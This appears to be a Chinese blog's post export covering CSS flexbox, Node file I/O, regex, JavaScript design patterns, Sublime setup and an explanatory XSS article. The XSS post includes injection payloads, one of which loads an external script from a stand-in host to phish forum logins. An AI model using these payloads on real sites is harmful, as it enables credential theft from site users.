flex-basis的简写，默认值为0 1 auto，*/ align-self: auto | flex-start | flex-end | center | baseline | stretch; /*单独对齐方式：自动（默认） | 顶部对齐 | 底部对齐 | 居中对齐 | 上下对齐并铺满 | 文本基线对齐*/&#125; 兼容写法 首先是定义容器的 display 属性： 1234567.box&#123; display: -webkit-box; /* 老版本语法: Safari, iOS, Android browser, older WebKit browsers. */ display: -moz-box; /* 老版本语法: Firefox (buggy) */ display: -ms-flexbox; /* 混合版本语法: IE 10 */ display: -webkit-flex; /* 新版本语法: Chrome 21+ */ display: flex; /* 新版本语法: Opera 12.1, Firefox 22+ */&#125; 由于旧版语法并没有列入W3C标准，所以这里不用写 display:box ，下面的语法也是一样的。 这里还要注意的是，如果子元素是行内元素，在很多情况下都要使用 display:block 或 display:inline-block 把行内子元素变成块元素（例如使用 box-flex 属性），这也是旧版语法和新版语法的区别之一。 子元素主轴对齐方式 123456.box&#123; -webkit-box-pack: center; -moz-justify-content: center; -webkit-justify-content: center; justify-content: center;&#125; 这里旧版语法有4个参数，而新版语法有5个参数，兼容写法新版语法的 space-around 是不可用的： 123456.box&#123; box-pack: start | end | center | justify; /*主轴对齐：左对齐（默认） | 右对齐 | 居中对齐 | 左右对齐*/ justify-content: flex-start | flex-end | center | space-between | space-around; /*主轴对齐方式：左对齐（默认） | 右对齐 | 居中对齐 | 两端对齐 | 平均分布*/&#125; 子元素交叉轴对齐方式 123456.box&#123; -webkit-box-align: center; -moz-align-items: center; -webkit-align-items: center; align-items: center;&#125; 这里的参数除了写法不同，其实是功能是一样的： 123456.box&#123; box-align: start | end | center | baseline | stretch; /*交叉轴对齐：顶部对齐（默认） | 底部对齐 | 居中对齐 | 文本基线对齐 | 上下对齐并铺满*/ align-items: flex-start | flex-end | center | baseline | stretch; /*交叉轴对齐方式：顶部对齐（默认） | 底部对齐 | 居中对齐 | 上下对齐并铺满 | 文本基线对齐*/&#125; 子元素的显示方向 子元素的显示方向可通过 box-direction + box-orient + flex-direction 实现，下面请看实例： 左到右 1234567.box&#123; -webkit-box-direction: normal; -webkit-box-orient: horizontal; -moz-flex-direction: row; -webkit-flex-direction: row; flex-direction: row;&#125; 右到左 12345678.box&#123; -webkit-box-pack: end; -webkit-box-direction: reverse; -webkit-box-orient: horizontal; -moz-flex-direction: row-reverse; -webkit-flex-direction: row-reverse; flex-direction: row-reverse;&#125; 这里补充说明一点： box 写法的 box-direction 只是改变了子元素的排序，并没有改变对齐方式，需要新增一个 box-pack 来改变对齐方式。 上到下 1234567.box&#123; -webkit-box-direction: normal; -webkit-box-orient: vertical; -moz-flex-direction: column; -webkit-flex-direction: column; flex-direction: column;&#125; 下到上 12345678.box&#123; -webkit-box-pack: end; -webkit-box-direction: reverse; -webkit-box-orient: vertical; -moz-flex-direction: column-reverse; -webkit-flex-direction: column-reverse; flex-direction: column-reverse;&#125; 是否允许子元素伸缩123456.item&#123; -webkit-box-flex: 1.0; -moz-flex-grow: 1; -webkit-flex-grow: 1; flex-grow: 1;&#125; 123456.item&#123; -webkit-box-flex: 1.0; -moz-flex-shrink: 1; -webkit-flex-shrink: 1; flex-shrink: 1;&#125; 上面是允许放大，box语法中 box-flex 如果不是0就表示该子元素允许伸缩，而flex是分开的，上面 flex-grow 是允许放大（默认不允许），下面的 flex-shrink 是允许缩小（默认允许）。box-flex 默认值为0，也就是说，在默认的情况下，在两个浏览器中的表现是不一样的： 这里还有一点，就是新旧语法的算法是不一样的，假设 box-flex 的值不等于0，旧语法中，如果有多余的空间，box-flex 的值越大，说明空白部分的占比越多，反之亦然： 而新版的语法中，放大的比例是直接按 flex-grow 的值来分配的，flex-grow 的缩放会覆盖 flex-shrink:0，看例子： 参数： 12345678.item&#123; box-flex: &lt;value; /*伸缩：&lt;一个浮点数，默认为0.0，即表示不可伸缩，大于0的值可伸缩，柔性相对*/ flex-grow: &lt;number; /* default 0 */ /*放大：默认0（即如果有剩余空间也不放大，值为1则放大，2是1的双倍大小，以此类推）*/ flex-shrink: &lt;number; /* default 1 */ /*缩小：默认1（如果空间不足则会缩小，值为0不缩小）*/&#125; 子元素的显示次序123456.item&#123;-webkit-box-ordinal-group: 1;-moz-order: 1;-webkit-order: 1;order: 1;&#125;","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"}]},{"title":"Node读取文件","date":"2016-10-12T01:41:32.000Z","path":"2016/10/12/node/","text":"读取文件1234fs.readFile(psth,(err,data)=&gt;&#123; if (err) console(err) console.log(data.toString()) &#125;) ###写入文件 12345678//追加写入fs.appendFile(filePath, \"追加的\", (err) =&gt;&#123; if(err) &#123; console.log(err) return &#125; console.log(\"writeFile success\") &#125;) 1234567//覆盖写入fs.writeFile(filePath, \"我是谁\", (err)=&gt;&#123; if(err) &#123; console.log(err) return &#125; console.log(\"writeFile success\")","comments":true,"tags":[{"name":"node","slug":"node","permalink":"http://www.wanyifeng.top/tags/node/"}]},{"title":"正则表达式","date":"2016-10-11T13:51:40.000Z","path":"2016/10/11/正则表达式简单使用/","text":"正则表达式简单使用 12345678910. 表示除了\\r\\n以外的任意的单个字符[0-9] 表示的是0到9之间任何一个整数数字() 提升优先级别和提取组| 或者，.+ 是任意字符出现1次到无限次.* 是任意字符串出现0次到无限次.? 任意字符出现0次到1次&#123;1,2&#125; 一次或两次,&#123;1,&#125;最少一次\\d数字,\\D非数字,\\s空白,\\S非空白,\\w非特殊符号,\\W特殊符号^以…开始,$以…结束 元字符 12345678910111213141516171819202122232425常用元字符. 匹配除换行符以外的任意字符\\w 匹配字母或数字或下划线或汉字\\s 匹配任意的空白符\\d 匹配数字\\b 匹配单词的开始或结束^ 匹配行的开始$ 匹配行的结束常用反义元字符\\W 匹配任意不是字母，数字，下划线，汉字的字符\\S 匹配任意不是空白符的字符\\D 匹配任意非数字的字符\\B 匹配不是单词开头或结束的位置[^x] 匹配除了x以外的任意字符[^aeiou] 匹配除了aeiou这几个字母以外的任意字符常用重复限定符* 重复零次或更多次+ 重复一次或更多次? 重复零次或一次&#123;n&#125; 重复n次&#123;n,&#125; 重复n次或更多次&#123;n,m&#125; 重复n到m次 简单使用 1234567891011121314151617181920212223console.log(/./.test(\"除了回车换行以为的任意字符\"));console.log(/.*/.test(\"0个到多个\"));console.log(/.+/.test(\"1个到多个\"));console.log(/.?/.test(\"哈哈\"));console.log(/[0-9]/.test(\"9527\"));console.log(/[a-z]/.test(\"what\"));console.log(/[A-Z]/.test(\"Are\"));console.log(/[a-zA-Z]/.test(\"干啥子\"));console.log(/[0-9a-zA-Z]/.test(\"9ebg\"));console.log(/b|ara/.test(\"abra\"));console.log(/[a-z]&#123;2,3&#125;/.test(\"ar\"));//a-z字母出现2到三次//简单的写法console.log(/\\d/.test(\"998\"));console.log(/\\d*/.test(\"998\"));console.log(/\\d+/.test(\"998\"));console.log(/\\d&#123;0,&#125;/.test(\"998\"));console.log(/\\d&#123;2,3&#125;/.test(\"998\"));console.log(/\\D/.test(\"eat\"));console.log(/\\s/.test(\" \"));console.log(/\\S/.test(\"嘎嘎\"));console.log(/\\w/.test(\"hi9527哦\"));console.log(/\\W/.test(\"$%^\")); js使用 12345678910111213var reg = /&#123;&#123;(\\w+)&#125;&#125;/;reg.exec(templateString);//exec() 方法检索字符串中的指定值。返回值是被找到的值。如果没有发现匹配，则返回 null。templateString为要进行匹配的字符串//该方法返回的是数字//去除空格 var space = function(data)&#123; return data.replace(/^\\s+|\\s+$/g,\"\"); &#125; console.log( space(\" 212 122 \")) // 判断是否符合正则表达式 // 语法: /正则表达式/.test(“hello”);返回值布尔类型 console.log(/b|ara/.test(\"abra\")); replace stringObject.replace(regexp/substr,replacement) 参数 描述 regexp/substr 必需。规定子字符串或要替换的模式的 RegExp 对象。请注意，如果该值是一个字符串，则将它作为要检索的直接量文本模式，而不是首先被转换为 RegExp 对象。 replacement 必需。一个字符串值。规定了替换文本或生成替换文本的函数。 $的值表示正则表达式括号匹配的值 在Function的第一个参数为整个正则表达式匹配到的值 以后的每个参数对应到真正表达式括号匹配的值callback可以传形参arguments可以获取到? 123\"wan - y i - fieng\".replace(/\\s?-\\s?(\\w)\\s?(\\w)\\s?/g,function (a,b)&#123; console.log(arguments);//[\" - y i \", \"y\", \"i\", 3, \"wan - y i - fieng\"]: &#125;) 字符 替换文本 $$1、$2、…、$99 与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。 $&amp; 与 regexp 相匹配的子串。 $` 位于匹配子串左侧的文本。 $’ 位于匹配子串右侧的文本。 $$ 直接量符号。 1234\"Visit Microsoft!\".replace(/Microsoft/, \"W3School\")name = \"Doe, John\";name.replace(/(\\w+)\\s*, \\s*(\\w+)/, \"$2 $1\"); replace函数参数(模板引擎实现原理)1234567var str = \"&lt;p&gt;??&#123;0&#125;&lt;/p&gt;&lt;h1&gt;??&#123;1&#125;&lt;/h1&gt;\"var a = str.replace(/\\&lt;(\\w+)\\&gt;\\?\\?&#123;(\\d+)&#125;/g,function($1,$2,$3)&#123; console.log($1) // 全局匹配 console.log($2) // 第一个子匹配 console.log($3) // 第二个子匹配&#125;)console.log(a) // 返回替代后的结果 防止脚本注入 12345function checkData(domObj) &#123; if (/['\")-&gt;&lt;&amp;\\\\\\/\\.]/.test(domObj.value)) &#123; alert('包含特殊字符，不允许提交!'); &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"发布—订阅模式","date":"2016-10-10T01:35:12.000Z","path":"2016/10/10/发布订阅模式模式/","text":"​ 发布—订阅模式又叫观察者模式，它定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。在JavaScript 开发中，我们一般用事件模型来替代传统的发布—订阅模式。 现实中的发布－订阅模式 ​ 不论是在程序世界里还是现实生活中，发布—订阅模式的应用都非常之广泛。我们先看一个现实中的例子。​ 小明最近看上了一套房子，到了售楼处之后才被告知，该楼盘的房子早已售罄。好在售楼MM告诉小明，不久后还有一些尾盘推出，开发商正在办理相关手续，手续办好后便可以购买。但到底是什么时候，目前还没有人能够知道。​ 于是小明记下了售楼处的电话，以后每天都会打电话过去询问是不是已经到了购买时间。除了小明，还有小红、小强、小龙也会每天向售楼处咨询这个问题。一个期过后，售楼MM 决定辞职，因为厌倦了每天回答1000 个相同内容的电话。​ 当然现实中没有这么笨的销售公司，实际上故事是这样的：小明离开之前，把电话号码留在了售楼处。售楼MM 答应他，新楼盘一推出就马上发信息通知小明。红、小强和小龙也是一样，他们的电话号码都被记在售楼处的花名册上，新楼盘推出的候，售楼MM会翻开花名册，遍历上面的电话号码，依次发送一条短信来通知他们。 1234567891011121314151617181920212223242526var salesOffices = &#123;&#125;; // 定义售楼处salesOffices.clientList = &#123;&#125;; // 缓存列表，存放订阅者的回调函数salesOffices.listen = function(key, fn) &#123; if(!this.clientList[key]) &#123; // 如果还没有订阅过此类消息，给该类消息创建一个缓存列表 this.clientList[key] = []; &#125; this.clientList[key].push(fn); // 订阅的消息添加进消息缓存列表&#125;;salesOffices.trigger = function() &#123; // 发布消息 var key = Array.prototype.shift.call(arguments), // 取出消息类型 fns = this.clientList[key]; // 取出该消息对应的回调函数集合 if(!fns || fns.length === 0) &#123; // 如果没有订阅该消息，则返回 return false; &#125; for(var i = 0, fn; fn = fns[i++];) &#123; fn.apply(this, arguments); // (2) // arguments 是发布消息时附送的参数 &#125;&#125;;salesOffices.listen('squareMeter88', function(price) &#123; // 小明订阅88 平方米房子的消息 console.log('价格= ' + price); // 输出： 2000000&#125;);salesOffices.listen('squareMeter110', function(price) &#123; // 小红订阅110 平方米房子的消息 console.log('价格= ' + price); // 输出： 3000000&#125;);salesOffices.trigger('squareMeter88', 2000000); // 发布88 平方米房子的价格salesOffices.trigger('squareMeter110', 3000000); // 发布110 平方米房子的价格 精简版 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192var office = &#123;&#125;office.list = &#123;&#125;office.subscription = function(key, fn) &#123; if(!this.list[key]) &#123; this.list[key] = [] &#125; this.list[key].push(fn)&#125;office.issue = function() &#123; var key = [].shift.call(arguments), fns = this.list[key]; if(!fns || fns.length == 0) &#123; return false &#125; for(var i = 0, fn; fn = fns[i++];) &#123; fn.apply(this, arguments) &#125;&#125;office.subscription(\"SPA\", function(data) &#123; console.log(\"AAAAA\")&#125;)office.issue(\"SPA\")var installEvent = function(obj) &#123; for(var i in event) &#123; obj[i] = event[i]; &#125;&#125;;//方法增强 添加删除发布的方法var office = &#123;&#125;office.clientList = &#123;&#125; //缓存回调/*** 发布订阅* @param &#123;Object&#125; id 订阅id 唯一* @param &#123;Object&#125; key 订阅名称 可以相同 * @param &#123;Object&#125; fn 订阅回调*/office.listen = function(id,key,fn)&#123; if(!this.clientList[key])&#123; this.clientList[key] = &#123;&#125; &#125; if(typeof fn == \"function\")&#123; this.clientList[key][id] = fn; return this; &#125;else&#123; throw(\"参数异常\") &#125;&#125;/*** 取消订阅* @param &#123;Object&#125; id 订阅id 唯一* @param &#123;Object&#125; key 订阅名称*/office.offListen = function(id,key)&#123; if(this.clientList[key] &amp;&amp; this.clientList[key][id])&#123; delete this.clientList[key][id] return this &#125;else&#123; return false &#125;&#125;/*** 发布触发订阅 第一个参数为订阅名称*/office.trigger = function()&#123; var key = Array.prototype.shift.call(arguments), fns = this.clientList[key]; if(!fns || this.isNullObj(fns))&#123; return this &#125; for (var key in fns) fns &amp;&amp; fns[key].apply(this,arguments) return this&#125;office.isNullObj = function(obj)&#123; for (var key in obj) return false return this&#125;//订阅office.listen(\"001\",\"getPage\",function(index)&#123; console.log(index)&#125;).listen(\"002\",\"getPage\",function(index,pages)&#123; console.log(index) console.log(pages)&#125;)//发布 .trigger(\"getPage\",'2',\"888\")//取消预约 .offListen (\"002\",\"getPage\")//发布 .trigger(\"getPage\",'3',\"777\"); 小结 ​ 发布—订阅模式的优点非常明显，一为时间上的解耦，二为对象之间的解耦。它的应用非常广泛，既可以用在异步编程中，也可以帮助我们完成更松耦合的代码编写。发布—订阅模式还可以用来帮助实现一些别的设计模式，比如中介者模式。 从架构上来看，无论是MVC 还是MVVM，都少不了发布—订阅模式的参与，而且JavaScript 本身也是一门基于事件驱动的语言。 ​ 当然，发布—订阅模式也不是完全没有缺点。创建订阅者本身要消耗一定的时间和内存，而且当你订阅一个消息后，也许此消息最后都未发生，但这个订阅者会始终存在于内存中。","comments":true,"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://www.wanyifeng.top/tags/设计模式/"}]},{"title":"代理模式","date":"2016-10-09T03:33:11.000Z","path":"2016/10/09/代理模式/","text":"代理模式是为一个对象提供一个代用品或占位符，以便控制对它的访问。 ​ 代理模式的关键是，当不方便直接访问一个对象或者不满足需要的时候，提供一个替身对象来控制对这个对象的访问，实际上访问的是替身对象。替身对象对请求做出一些处理之后，再把请求转交给本体对象 虚拟代理实现图片预加载 图片预加载是一种常用的技术，如果直接给某个img 标签节点设置src 属性，由于图片过大或者网络不佳，图片的位置往往有段时间会是一片空白。常见的做法是先用一张loading 图片占位，然后用异步的方式加载图片，等图片加载好了再把它填充到img 节点里，这种场景就很适合使用虚拟代理。 123456789101112131415161718var imgNode = document.createElement('img');document.body.appendChild(imgNode);var img = new Image;img.onload = function() &#123; myImage.setSrc(this.src);&#125;var myImage = &#123; setSrc: function(src) &#123; imgNode.src = src; &#125;&#125;var proxyImage = &#123; setSrc: function(src) &#123; myImage.setSrc(\"../img/login.gif\"); img.src = src; &#125;&#125;proxyImage.setSrc('../img/b.bmp'); 小结 在JavaScript 开发中最常用的是虚拟代理和缓存代理。虽然代理模式非常有用，但我们在编写业务代码的时候，往往不需要去预先猜测是否需要使用代理模式。当真正发现不方便直接访问某个对象的时候，再编写代理也不迟。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"设计模式","slug":"设计模式","permalink":"http://www.wanyifeng.top/tags/设计模式/"}]},{"title":"策略模式","date":"2016-09-26T06:13:11.000Z","path":"2016/09/26/策略模式/","text":"​ 在程序设计中，我们也常常遇到类似的情况，要实现某一个功能有多种方案可以选择。比如一个压缩文件的程序，既可以选择zip 算法，也可以选择gzip 算法。这些算法灵活多样，而且可以随意互相替换。这种解决方案就是策略模式。 用策略模式计算奖金 12345678910111213141516var strategies = &#123; \"S\": function(salary) &#123; return salary * 4; &#125;, \"A\": function(salary) &#123; return salary * 3; &#125;, \"B\": function(salary) &#123; return salary * 2; &#125;&#125;;var calculateBonus = function(level, salary) &#123; return strategies[level](salary);&#125;;console.log(calculateBonus('S', 20000)); // 输出：80000console.log(calculateBonus('A', 10000)); // 输出：30000 定义一系列的算法，把它们各自封装成策略类，算法被封装在策略类内部的方法里。在客户对calculateBonus发起请求的时候，calculateBonus总是把请求委托给这些策略对象中间的某一个进行计算。 多态在策略模式中的体现 ​ 所有跟计算奖金有关的逻辑不再放在strategies中，而是分布在各个策略对象中。strategies并没有计算奖金的能力，而是把这个职责委托给了某个策略对象。每个策略对象负责的算法已被各自封装在对象内部。当我们对这些策略对象发出“计算奖金”的请求时，它们会返回各自不同的计算结果，这正是对象多态性的体现，也是“它们可以相互替换”的目的。替换strategies中当前保存的策略对象，便能执行不同的算法来得到我们想要的结果。 给某个文本输入框添加多种校验规则 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354var strategies = &#123; isNonEmpty: function(value, errorMsg) &#123; // 不为空 if(value === '') &#123; return errorMsg; &#125; &#125;, minLength: function(value, length, errorMsg) &#123; // 限制最小长度 if(value.length &lt; length) &#123; return errorMsg; &#125; &#125;, isMobile: function(value, errorMsg) &#123; // 手机号码格式 if(!/(^1[3|5|8][0-9]&#123;9&#125;$)/.test(value)) &#123; return errorMsg; &#125; &#125;&#125;;var validataFunc = function() &#123; var validator = new Validator(); // 创建一个validator 对象 /***************添加一些校验规则****************/ validator.add(registerForm.userName, 'isNonEmpty', '用户名不能为空'); validator.add(registerForm.password, 'minLength:6', '密码长度不能少于6 位'); validator.add(registerForm.phoneNumber, 'isMobile', '手机号码格式不正确'); var errorMsg = validator.start(); // 获得校验结果 return errorMsg; // 返回校验结果&#125;var registerForm = document.getElementById('registerForm');registerForm.onsubmit = function() &#123; var errorMsg = validataFunc(); // 如果errorMsg 有确切的返回值，说明未通过校验 if(errorMsg) &#123; alert(errorMsg); return false; // 阻止表单提交 &#125;&#125;;var Validator = function() &#123; this.cache = []; // 保存校验规则&#125;;Validator.prototype.add = function(dom, rule, errorMsg) &#123; var ary = rule.split(':'); // 把strategy 和参数分开 this.cache.push(function() &#123; // 把校验的步骤用空函数包装起来，并且放入cache var strategy = ary.shift(); // 用户挑选的strategy ary.unshift(dom.value); // 把input 的value 添加进参数列表 ary.push(errorMsg); // 把errorMsg 添加进参数列表 return strategies[strategy].apply(dom, ary); &#125;);&#125;;Validator.prototype.start = function() &#123; for(var i = 0, validatorFunc; validatorFunc = this.cache[i++];) &#123; var msg = validatorFunc(); // 开始校验，并取得校验后的返回信息 if(msg) &#123; // 如果有确切的返回值，说明校验没有通过 return msg; &#125; &#125;&#125;; 策略模式的优缺点 策略模式提供了对开放—封闭原则的完美支持，将算法封装在独立的strategy 中，使得它们易于切换，易于理解，易于扩展。 策略模式中的算法也可以复用在系统的其他地方，从而避免许多重复的复制粘贴工作。 在策略模式中利用组合和委托来让Context 拥有执行算法的能力，这也是继承的一种更轻便的替代方案。 当然，策略模式也有一些缺点，但这些缺点并不严重。 使用策略模式会在程序中增加许多策略类或者策略对象，但实际上这比把它们负责的逻辑堆砌在Context 中要好。 小结 在JavaScript 语言的策略模式中，策略类往往被函数所代替，这时策略模式就成为一种“隐形”的模式。尽管这样，从头到尾地了解策略模式，不仅可以让我们对该模式有更加透彻的了解，也可以使我们明白使用函数的好处。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"设计模式","slug":"设计模式","permalink":"http://www.wanyifeng.top/tags/设计模式/"}]},{"title":"单例模式","date":"2016-09-24T03:33:21.000Z","path":"2016/09/24/单例模式/","text":"​ 单例模式的定义是：保证一个类仅有一个实例，并提供一个访问它的全局访问点。单例模式是一种常用的模式，有一些对象我们往往只需要一个，全局缓存、浏览器中的window 对象等。 123456789101112131415var Singleton = function(name) &#123; this.name = name;&#125;;Singleton.prototype.getName = function() &#123; alert(this.name);&#125;;Singleton.getInstance = (function() &#123; var instance = null; return function(name) &#123; if(!instance) &#123; instance = new Singleton(name); &#125; return instance; &#125;&#125;)(); 我们通过Singleton.getInstance 来获取Singleton 类的唯一对象 惰性单例 ​ 惰性单例指的是在需要的时候才创建对象实例。惰性单例是单例模式的重点，这种技术在实际开发中非常有用，有用的程度可能超出了我们的想象 ​ instance 实例对象总是在我们调用Singleton.getInstance 的时候才被创建，而不是在页面加载好的时候就创建，代码如下： 123456789Singleton.getInstance = (function() &#123; var instance = null; return function(name) &#123; if(!instance) &#123; instance = new Singleton(name); &#125; return instance; &#125;&#125;)(); 在getSinge 函数中，实际上也提到了闭包和高阶函数的概念。单例模式是一种简单但非常实用的模式，特别是惰性单例技术，在合适的时候才创建对象，并且只创建唯一的一个","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"设计模式","slug":"设计模式","permalink":"http://www.wanyifeng.top/tags/设计模式/"}]},{"title":"Subline配置Node插件","date":"2016-09-15T02:03:21.000Z","path":"2016/09/15/nodejs在插件subline-text3配置方法/","text":"点击菜单View—&gt;Show Console,复制如下内容到Sublime底部的Console,点击回车 1&lt;span style=\"font-size:18px;\"&gt;import urllib.request,os; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), 'wb').write(urllib.request.urlopen( 'http://sublime.wbond.net/' + pf.replace(' ','%20')).read())&lt;/span&gt; 3.Sublime中集成NodeJS 3.1、下载Nodejs插件，下载地址为： https://github.com/tanepiper/SublimeText-Nodejs 下载zip压缩包后解压，文件名改为Nodejs 3.2、打开Sublime Text3，点击菜单“Perferences” =&gt;“Browse Packages”打开“Packages”文件夹，并将第1部的Nodejs文件夹剪切进来 3.3、打开文件“Nodejs.sublime-build”，将代码 “encoding”: “cp1252” 改为 “encoding”: “utf8” ，将代码 “cmd”: [“taskkill /F /IM node.exe &amp; node”, “$file”] 改为 “cmd”: [“node”, “$file”] ，保存文件 3.4、打开文件“Nodejs.sublime-settings”，将代码 “node_command”: false改为 “node_command”: “D:\\Program Files\\nodejs\\node.exe” ，将代码 “npm_command”: false 改为 “npm_command”: “D:\\Program Files\\nodejs\\npm.cmd” ，保存文件","comments":true,"tags":[{"name":"node","slug":"node","permalink":"http://www.wanyifeng.top/tags/node/"}]},{"title":"XSS跨站脚本攻击","date":"2016-09-12T02:53:21.000Z","path":"2016/09/12/xxh攻击跨域脚本攻/","text":"XSS跨站脚本攻击一直都被认为是客户端Web安全中最主流的攻击方式。因为Web环境的复杂性以及XSS跨站脚本攻击的多变性，使得该类型攻击很难彻底解决。那么，XSS跨站脚本攻击具体攻击行为是什么，又该如何进行有效的防范呢？本文对此进行了有针对性的具体实例分析。 跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表（Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。 下面这个页面的主要作用是获取用户输入的参数作为用户名，并在页面中显示“欢迎您，XXX”的形式，具体代码如下： 1234&lt;?phpusername = _GET[\"name\"];echo \"&lt;p&gt;欢迎您, \".$username.\"!&lt;/p&gt;\";?&gt; 正常情况下，用户会在URL中提交参数name的值为自己的姓名，然后该数据内容会通过以上代码在页面中展示，如用户提交姓名为“张三”，完整的URL地址如下： http://localhost/test.php?name=张三 在浏览器中访问时， 此时，因为用户输入的数据信息为正常数据信息，经过脚本处理以后页面反馈的源码内容为欢迎您, 张三!。但是如果用户提交的数据中包含有可能被浏览器执行的代码的话，会是一种什么情况呢？我们继续提交name的值为alert(/我的名字是张三/),即完整的URL地址为http://localhost/test.php?name=alert(/我的名字是张三/) 在浏览器中访问时，我们发现会有弹窗提示， 那么此时页面的源码又是什么情况呢？ 源码变成了“欢迎您, alert(/我的名字是张三/)!”，从源代码中我们发现，用户输入的数据中，与标签中的代码被浏览器执行了，而这并不是网页脚本程序想要的结果。这个例子正是最简单的一种XSS跨站脚本攻击的形式，称之为反射型XSS。 XSS跨站脚本攻击的分类 根据XSS跨站脚本攻击存在的形式及产生的效果，可以将其分为以下三类。 一、 反射型XSS跨站脚本攻击 反射型XSS脚本攻击即如我们上面所提到的XSS跨站脚本攻击方式，该类型只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输出，导致输出的数据中存在可被浏览器执行的代码数据。由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。 二、 存储型XSS跨站脚本攻击 存储型XSS脚本攻击是指Web应用程序会将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，因此存储型XSS具有较强的稳定性。 存储型XSS脚本攻击最为常见的场景就是在博客或新闻发布系统中，黑客将包含有恶意代码的数据信息直接写入文章或文章评论中，所有浏览文章或评论的用户，都会在他们客户端浏览器环境中执行插入的恶意代码。如流行的Bo-Blog程序的早期版本中存在对用户提交评论数据过滤不严导致的XSS跨站脚本攻击漏洞，黑客可以在文章评论中提交插入恶意数据的UBB代码，提交后，Bo-Blog程序会将数据保存至数据库中，当用户浏览该日志时，就会执行插入的恶意代码， 三、 基于DOM的XSS跨站脚本攻击 基于DOM的XSS跨站脚本攻击是通过修改页面DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。让我们来针对如下代码进行详细分析： 12345678910111213141516&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM Based XSS Demo&lt;/title&gt;&lt;script&gt;function xsstest()&#123; var str = document.getElementById(\"input\").value; document.getElementById(\"output\").innerHTML = \"\";&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"output\"&gt;&lt;/div&gt; &lt;input type=\"text\" id=\"input\" size=50 value=\"\" /&gt; &lt;input type=\"button\" value=\"提交\" onclick=\"xsstest()\" /&gt; &lt;/body&gt;&lt;/html&gt; 以上代码的作用是提交一个图片的URL地址以后，程序会将图片在页面中进行展示，如我们提交百度LOGO图片的地址http://www.baidu.com/img/baidu_sylogo1.gif，那么在页面中展示结果。 当用户输入完百度LOGO的地址，点击“提交”按钮后，“提交”按钮的onclick事件会调用xsstest()函数。而xsstest()函数会获取用户提交的地址，通过innerHTML将页面的DOM节点进行修改，把用户提交的数据以HTML代码的形式写入页面中并进行展示。以上例子中输出的HTML代码为“&lt;img src=” http://www.baidu.com/img/baidu_sylogo1.gif”&gt;”。 以上情况为正常的用户输入情况，那黑客又是怎么利用该种类型代码实现XSS跨站脚本攻击的呢？黑客可以通过构造如下数据，输入“#’ onerror=’javascript:alert(/DOM Based XSS Test/)”，在浏览器中提交后，发现代码果然被执行，出现了弹窗提示 XSS跨站脚本攻击实例 以上是针对XSS跨站脚本攻击三种类型的简单介绍。看了上面的描述朋友们或许会想，难道仅仅弹出一个提示框就是XSS跨站脚本攻击了吗？答案当然是否定的，XSS跨站脚本攻击的利用可以实现多种效果，甚至可以说XSS跨站脚本攻击漏洞的利用是一种黑客攻击的艺术，下面我们结合具体实例进行详细的分析和描述，了解一下XSS跨站脚本攻击都能做些什么事情。 XSS跨站脚本攻击利用钓鱼 目前，网络钓鱼攻击的方式比较多，包括申请注册相似域名，构建相似度高的网站环境和发布虚假中奖信息等，但是以上钓鱼攻击方式针对有一定安全意识的网民来说，很难实现成功的钓鱼攻击。然而通过XSS跨站脚本攻击漏洞进行的钓鱼攻击，即使有一定安全意识的网民，也无法抵御。这里我们以盛大游戏论坛的XSS跨站脚本攻击漏洞利用的钓鱼攻击演示（目前，该漏洞已经修复）。首先，我们需要了解的是，盛大的游戏登录都是使用盛大通行证进行登录的，而盛大的游戏论坛也是使用盛大通行证进行登录，所以，如果黑客通过盗取游戏玩家登录论坛时的信息，就相当于盗取了玩家游戏账号和密码。盛大的游戏论坛就存在XSS跨站脚本攻击漏洞，使得黑客可以通过该漏洞获取用户的账号和密码。存在过滤不严的位置为用户资料中的个人主页部分，通过在个人主页栏中输入如下代码： 1[url]http://'' STYLE='a:expression(document.write(\"&lt;s\\143ript language=javas\\143ript src=http://www.123.com/1.jpg Charset=GB23&gt;&lt;/s\\143ript&gt;\"))' target=_blank[/url] 然后利用该账号在论坛中发帖子或回复，这样当其他玩家访问我们发布或回复的帖子时，就会执行我们插入的恶意代码。http://www.123.com/1.jpg就是我们构造的恶意代码，这个代码是我们用来钓鱼的页面， 显示的内容和盛大官方游戏论坛登录的页面一样，如果不通过查看网页源代码的方式是无法从页面显示中看出任何问题的，当玩家输入通行证账号和密码信息并点击登录时，账号提交的地址不是盛大的服务器，而是黑客的服务器。从源码中，可以看到账号和密码发送到的黑客服务器账号接收程序的地址， XSS跨站脚本攻击盗取用户Cookie信息 